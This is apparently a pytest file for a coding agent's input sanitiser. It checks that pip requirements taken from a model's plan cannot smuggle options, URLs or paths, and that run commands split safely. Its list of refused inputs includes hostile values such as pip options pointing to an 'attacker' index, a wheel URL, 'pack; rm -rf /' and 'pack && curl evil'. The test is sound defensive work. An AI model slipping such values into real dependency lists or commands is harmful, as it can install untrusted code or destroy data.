"""What the coding agent will and will not hand to pip / to a shell.

Two bugs, from the same file, from the same root cause — a model's JSON treated
as trusted input:

  * `_install_dependencies` did `pip install` + the planner's `dependencies`
    array verbatim. pip reads anything starting with `-` as an OPTION, so
    `--index-url https://attacker/simple`, `-r /etc/reqs.txt` and a direct wheel
    URL all installed from somewhere the user never chose. `_try_auto_install`
    did the same with a name scraped out of the generated project's own stderr.

  * `_run_project` split the plan's `run_command` with `.split()` — whitespace,
    not quoting. `python "my app.py"` became three arguments, and an empty
    command raised IndexError which surfaced to the user as
    "Run error: list index out of range".

Both functions are pure, so neither test needs a model, a network or a
subprocess.
"""
from __future__ import annotations

import pytest

from actions.dev_agent import _safe_requirement, _split_command


# ── requirements ────────────────────────────────────────────────────────────

ACCEPTED = [
    ("requests", "requests"),
    ("numpy>=1.24", "numpy>=1.24"),
    ("Pillow==10.2.0", "Pillow==10.2.0"),
    ("requests >= 2.0", "requests>=2.0"),      # spaces normalised, not passed on
    ("pack[extra]==1.0", "pack[extra]==1.0"),
    ("python-dateutil~=2.9", "python-dateutil~=2.9"),
    ("  flask  ", "flask"),
]

REFUSED = [
    "--index-url https://attacker/simple",   # a pip OPTION, not a requirement
    "-r /etc/requirements.txt",
    "-e .",
    "--trusted-host evil",
    "https://attacker/pkg.whl",             # a URL, not a name
    "git+https://github.com/x/y",
    "../local-package",
    "some/path",
    "C:\\packages\\evil",
    "pack; rm -rf /",
    "pack && curl evil",
    "a b",                                   # two tokens
    "",
    "   ",
    "x" * 200,
]


@pytest.mark.parametrize("given,expected", ACCEPTED)
def test_a_plain_requirement_is_passed_through(given, expected):
    assert _safe_requirement(given) == expected


@pytest.mark.parametrize("given", REFUSED)
def test_an_option_url_or_path_is_refused(given):
    assert _safe_requirement(given) is None


def test_a_requirement_never_starts_with_a_dash():
    """The property that matters: pip can never see an option from this path."""
    for given, _expected in ACCEPTED:
        assert not _safe_requirement(given).startswith("-")


def test_no_refused_entry_is_ever_accepted():
    for given in REFUSED:
        assert _safe_requirement(given) is None


# ── run commands ────────────────────────────────────────────────────────────

def test_a_simple_command_splits_into_two():
    assert _split_command("python main.py") == ["python", "main.py"]


def test_a_quoted_argument_keeps_its_spaces():
    """`.split()` produced ['python', '"my', 'app.py"'] and the run failed."""
    assert _split_command('python "my app.py"') == ["python", "my app.py"]


def test_a_windows_path_survives_splitting():
    parts = _split_command('python "C:\\Users\\me\\app.py"')
    assert parts is not None
    assert parts[1].endswith("app.py")
    assert "\\" in parts[1]


@pytest.mark.parametrize("given", ["", "   ", "\t\n"])
def test_an_empty_command_is_none_not_an_index_error(given):
    assert _split_command(given) is None


def test_an_unbalanced_quote_is_none_not_an_exception():
    assert _split_command('python "unclosed') is None
